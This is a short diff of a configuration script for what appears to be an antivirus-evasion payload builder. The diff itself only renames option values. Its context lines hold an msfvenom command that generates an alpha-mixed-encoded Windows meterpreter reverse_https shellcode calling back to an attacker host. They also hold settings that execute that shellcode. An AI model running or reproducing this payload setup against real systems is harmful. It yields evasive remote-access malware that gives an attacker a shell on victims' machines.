@@ -23,18 +23,18 @@ LHOST=$GLOBAL_LHOST
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/alpha_mixed BufferRegister=EAX -a x86 --platform Windows -f raw > output/sc_alpha_mixed.txt
 
 # no command preexec
-set_command_source none
-set_command_exec none
+set_command_source no_data
+set_command_exec no_command
 
 # set shellcode source
 set_payload_source from_command_line_raw
 
 # set decoder and key source
 set_decoder none
-set_key_source none
+set_key_source no_data
 
 # set payload info source
-set_payload_info_source none
+set_payload_info_source no_data
 
 # set shellcode binding technique
 set_payload_execution_method exec_shellcode_ASCIIMSF
